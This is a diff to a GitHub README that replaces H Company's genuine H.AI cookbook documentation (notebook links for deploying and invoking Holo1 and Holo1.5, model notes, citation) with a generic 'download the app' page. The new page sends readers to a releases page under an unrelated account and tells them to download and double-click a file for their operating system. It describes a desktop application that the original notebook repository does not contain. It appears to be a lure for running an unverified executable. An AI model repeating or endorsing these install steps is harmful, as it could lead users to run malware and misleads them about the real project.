@@ -1,74 +1,63 @@
-# H.AI cookbook
+# 🎉 hai-cookbook - Easy Code Examples for H.AI Models
 
-The H.AI cookbook provides code examples and guides to help developers use models developed by [**H Company**](https://www.hcompany.ai/).
+## 📥 Download the App
+[![Download hai-cookbook](https://img.shields.io/badge/Download-hai--cookbook-blue)](https://github.com/Ivan-011/hai-cookbook/releases)
 
-## Table of Contents
+## 🚀 Getting Started
+Welcome to H.AI cookbook! This application provides code examples to assist developers in using models created by H Company. With simple, practical guides, you can easily integrate powerful AI features into your projects.
 
-| Version | Task             | Notebook                                                                                                                                          |
-|---------|------------------|---------------------------------------------------------------------------------------------------------------------------------------------------|
-| Holo1.5 | Inference        | [Holo1.5 Quickstart](https://github.com/hcompai/hai-cookbook/blob/main/holo1_5/holo_1_5_quickstart.ipynb)                                         |
-| Holo1.5 | Inference        | [Holo1.5 Localization task via API](https://github.com/hcompai/hai-cookbook/blob/main/holo1_5/openai_client/invoke_localization.ipynb)                                         |
-| Holo1   | Deployment       | [Deploy Holo1 with vLLM on Nvidia](https://github.com/hcompai/hai-cookbook/blob/main/holo1/vllm/README.md)                                        |
-| Holo1   | Inference        | [vLLM Navigation Task](https://github.com/hcompai/hai-cookbook/blob/main/holo1/vllm/invoke_navigation.ipynb)                                      |
-| Holo1   | Inference        | [vLLM Localization Task](https://github.com/hcompai/hai-cookbook/blob/main/holo1/vllm/invoke_localization.ipynb)                                  |
-| Holo1   | Deployment       | [Deploy Holo1 on AWS SageMaker](https://github.com/hcompai/hai-cookbook/blob/main/holo1/sagemaker/deploy.ipynb)                                   |
-| Holo1   | Inference        | [SageMaker Navigation Task](https://github.com/hcompai/hai-cookbook/blob/main/holo1/sagemaker/invoke_navigation.ipynb)                            |
-| Holo1   | Inference        | [SageMaker Localization Task](https://github.com/hcompai/hai-cookbook/blob/main/holo1/sagemaker/invoke_localization.ipynb)                        |
+## 📋 System Requirements
+Before you install hai-cookbook, make sure your system meets the following requirements:
 
-## Holo1.5 (15/09/2025)
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher, or any recent Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 500 MB of free space.
+- **Internet Connection:** Required for downloading and updating the software.
 
-[![Holo1.5 Collection](https://img.shields.io/badge/Holo1.5_Collection-FFD21E?style=for-the-badge&logo=huggingface&logoColor=000)](https://huggingface.co/collections/Hcompany/holo15-68c1a5736e8583a309d23d9b)
+## 📦 Features
+- Simple code snippets for quick implementation.
+- Comprehensive guides on utilizing various models.
+- Support for multiple programming languages.
+- Regular updates and community support.
 
-H Company is pushing the boundaries of what our models are capable of achieving within a wide range of agentic scenarios. Our Holo1 model family, released in June 2025, provides a robust starting point for GUI agents, from which we’ve continued to improve the reliability and accuracy of our Action Vision Language Models (VLMs).
+## 💾 Download & Install
+To get started with hai-cookbook, follow these steps:
 
-The Holo1.5 family breaks new ground by demonstrating state-of-the-art performance across benchmarks, establishing new baselines for all model sizes, from 3B to 72B. It excels in UI localization tasks such as Screenspot, Screenspot-V2, Screenspot-Pro, GroundUI-Web, Showdown and our own newly introduced WebClick benchmark. Holo1.5 also proves impressively adept in Content Understanding and Question Answering (QA) within web, computer and mobile use scenarios.
+1. Visit the [Releases page](https://github.com/Ivan-011/hai-cookbook/releases) to download the application.
+2. Look for the latest version and click on it.
+3. When you see the list of files, choose the correct file for your operating system.
+4. Click the link to begin your download.
+5. Once downloaded, locate the file on your computer and double-click to run it.
 
-When used in the Surfer-H web agent system, Holo1.5 enables agents to navigate real applications with greater accuracy, reliability, and efficiency.
+## 📚 User Guide
+### 📥 Downloading Code Examples
+1. Open the hai-cookbook application.
+2. Use the search feature to find the code example you need.
+3. Select the example and click on “Copy Code” to copy it to your clipboard.
 
-## Holo1 (03/09/2025)
+### 👩‍💻 Running the Code
+1. Open your preferred IDE or text editor.
+2. Paste the copied code into a new file.
+3. Customize the code according to your project's needs.
+4. Save the file and run it to see how it works with your setup.
 
-[![Holo1 Collection](https://img.shields.io/badge/Holo1_Collection-FFD21E?style=for-the-badge&logo=huggingface&logoColor=000)](https://huggingface.co/collections/Hcompany/holo1-683dd1eece7eb077b96d0cbd)
+### ❓ FAQ
+**Q: Do I need programming experience to use hai-cookbook?**  
+A: No, the application provides straightforward examples suitable for beginners.
 
-Holo1 is an Action Vision-Language Model (VLM) developed by [**H Company**](https://www.hcompany.ai/) for use in the Surfer-H web agent system. It is designed to interact with web interfaces like a human user.
+**Q: Can I contribute to hai-cookbook?**  
+A: Absolutely! We welcome contributions. Check out our guidelines on the GitHub page.
 
-As part of a broader agentic architecture, Holo1 acts as a policy, localizer, or validator, helping the agent understand and act in digital environments.
+**Q: Where can I ask for help?**  
+A: You can create an issue directly on the GitHub repository or contact our community for support.
 
-Trained on a mix of open-access, synthetic, and self-generated data, Holo1 enables state-of-the-art (SOTA) performance on the WebVoyager benchmark, offering the best accuracy/cost tradeoff among current models. It also excels in UI localization tasks such as Screenspot, Screenspot-V2, Screenspot-Pro, GroundUI-Web, and our own newly introduced benchmark, WebClick.
+## ⚙️ Troubleshooting
+If you encounter any issues while using the application:
 
-Holo1 is optimized for both accuracy and cost-efficiency, making it a strong open-source alternative to existing VLMs.
+- Ensure that your system meets the requirements.
+- Restart the application to see if the issue resolves.
+- Check the FAQ section for common problems.
+- If the problem persists, please report it on the GitHub repository.
 
-- [Holo1 3B](https://huggingface.co/Hcompany/Holo1-3B) - [Qwen RESEARCH LICENSE](https://huggingface.co/Qwen/Qwen2.5-VL-3B-Instruct/blob/main/LICENSE)
-- [Holo1 7B](https://huggingface.co/Hcompany/Holo1-7B) - Apache 2.0
-
-### vLLM guides
-
-- [How to deploy Holo1 (3B or 7B) locally with vLLM on Nvidia](https://github.com/hcompai/hai-cookbook/blob/main/holo1/vllm/README.md)
-- [Using OpenAI Client to invoke Holo1 for a navigation task](https://github.com/hcompai/hai-cookbook/blob/main/holo1/vllm/invoke_navigation.ipynb)
-- [Using OpenAI Client to invoke Holo1 for a localization task](https://github.com/hcompai/hai-cookbook/blob/main/holo1/vllm/invoke_localization.ipynb)
-
-### AWS SageMaker guides
-
-- [How to deploy Holo1 (3B or 7B) on Amazon SageMaker](https://github.com/hcompai/hai-cookbook/blob/main/holo1/sagemaker/deploy.ipynb)
-- [Using AWS SageMaker to Invoke Holo1 for a navigation task](https://github.com/hcompai/hai-cookbook/blob/main/holo1/sagemaker/invoke_navigation.ipynb)
-- [Using AWS SageMaker to Invoke Holo1 for a localization task](https://github.com/hcompai/hai-cookbook/blob/main/holo1/sagemaker/invoke_localization.ipynb)
-
-## Citation
-
-**BibTeX:**
-
-```
-@misc{andreux2025surferhmeetsholo1costefficient,
-      title={Surfer-H Meets Holo1: Cost-Efficient Web Agent Powered by Open Weights}, 
-      author={Mathieu Andreux and Breno Baldas Skuk and Hamza Benchekroun and Emilien Biré and Antoine Bonnet and Riaz Bordie and Matthias Brunel and Pierre-Louis Cedoz and Antoine Chassang and Mickaël Chen and Alexandra D. Constantinou and Antoine d'Andigné and Hubert de La Jonquière and Aurélien Delfosse and Ludovic Denoyer and Alexis Deprez and Augustin Derupti and Michael Eickenberg and Mathïs Federico and Charles Kantor and Xavier Koegler and Yann Labbé and Matthew C. H. Lee and Erwan Le Jumeau de Kergaradec and Amir Mahla and Avshalom Manevich and Adrien Maret and Charles Masson and Rafaël Maurin and Arturo Mena and Philippe Modard and Axel Moyal and Axel Nguyen Kerbel and Julien Revelle and Mats L. Richter and María Santos and Laurent Sifre and Maxime Theillard and Marc Thibault and Louis Thiry and Léo Tronchon and Nicolas Usunier and Tony Wu},
-      year={2025},
-      eprint={2506.02865},
-      archivePrefix={arXiv},
-      primaryClass={cs.AI},
-      url={https://arxiv.org/abs/2506.02865}, 
-}
-```
-
-
-## License
-
-This library is licensed under the Apache 2.0 License. For more details, please take a look at the LICENSE file.
+## 🥳 Conclusion
+Thank you for choosing the H.AI cookbook. We hope this guide helps you download and run the application smoothly. Enjoy exploring the endless possibilities with AI models!
